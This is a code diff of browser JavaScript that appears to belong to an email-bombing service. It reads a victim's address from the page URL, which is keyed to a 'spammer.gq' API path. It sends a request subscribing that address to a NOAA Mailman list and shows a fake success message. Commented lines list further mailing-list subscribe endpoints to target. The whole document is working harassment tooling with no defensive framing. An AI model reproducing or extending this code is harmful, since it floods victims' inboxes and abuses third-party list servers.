@@ -14,6 +14,8 @@ function makeid(length) {
 
 var url = "http://coral.aoml.noaa.gov/mailman/subscribe/coral-list?email="+path;
 
+alert(url)
+
 var xhr = new XMLHttpRequest();
 xhr.open("GET", url);
 
@@ -27,15 +29,6 @@ xhr.onreadystatechange = function () {
 
 xhr.send();
 
-idattack = makeid(30)
-    var str = window.location.href
-    arr = str.split('https://spammer.gq/api/?email='),
-    path = arr[arr.length - 1];
-    let start = document.getElementById("start");
-    start.textContent = '{"status":"success"}'
-    
- 
-
     
 /*var dataString4 = "email="+patch;
 $.ajax({type: "POST", url: "http://coral.aoml.noaa.gov/mailman/subscribe/cdhc", data: dataString4, cache: false,}) //no spam
@@ -47,4 +40,11 @@ $.ajax({type: "POST", url: "https://starj.com/mailman/subscribe/headlines_starj.
 $.ajax({type: "POST", url: "http://lists.vmware.com/mailman/subscribe/security-announce", data: dataString4, cache: false,}) //no spam
 
 $.ajax({type: "POST", url: "https://lists.drupal.org/mailman/subscribe/security-internals", data: dataString4, cache: false,}) //???
+
+idattack = makeid(30)
+    var str = window.location.href
+    arr = str.split('https://spammer.gq/api/?email='),
+    path = arr[arr.length - 1];
+    let start = document.getElementById("start");
+    start.textContent = '{"status":"success"}'
 </script>
